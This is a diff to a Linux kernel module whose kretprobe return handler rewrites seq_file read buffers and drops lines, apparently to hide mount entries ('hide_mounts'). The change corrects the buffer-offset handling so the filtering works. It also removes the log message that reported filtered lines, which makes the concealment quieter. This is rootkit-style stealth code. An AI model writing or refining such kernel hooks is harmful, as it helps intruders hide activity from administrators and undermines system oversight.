@@ -20,7 +20,7 @@ static int ret(struct kretprobe_instance *ri, struct pt_regs *regs)
     struct file *file;
     struct seq_file *m;
     char *buf, *src, *dst;
-    size_t total;
+    size_t end;
     int filtered;
 
     if (!iocb || !iocb->ki_filp || !iocb->ki_filp->f_path.dentry)
@@ -37,19 +37,19 @@ static int ret(struct kretprobe_instance *ri, struct pt_regs *regs)
     if (!mutex_trylock(&m->lock))
         return 0;
 
-    total = m->index + m->count;
-    if (total == 0 || total > m->size) {
+    if (m->count == 0 || m->index + m->count > m->size) {
         mutex_unlock(&m->lock);
         return 0;
     }
 
+    end = m->index + m->count;
     buf = m->buf;
     filtered = 0;
-    src = buf;
-    dst = buf;
+    src = buf + m->index;
+    dst = src;
 
-    while (src < buf + total) {
-        size_t remain = buf + total - src;
+    while (src < buf + end) {
+        size_t remain = buf + end - src;
         char *nl = memchr(src, '\n', remain);
         size_t len;
 
@@ -68,12 +68,8 @@ static int ret(struct kretprobe_instance *ri, struct pt_regs *regs)
         src += len;
     }
 
-    if (filtered) {
-        size_t new_cnt = dst - buf;
-        m->count = new_cnt;
-        m->index = 0;
-        printk(KERN_INFO "hide_mounts: filtered %d lines\n", filtered);
-    }
+    if (filtered)
+        m->count = dst - buf - m->index;
 
     mutex_unlock(&m->lock);
     return 0;
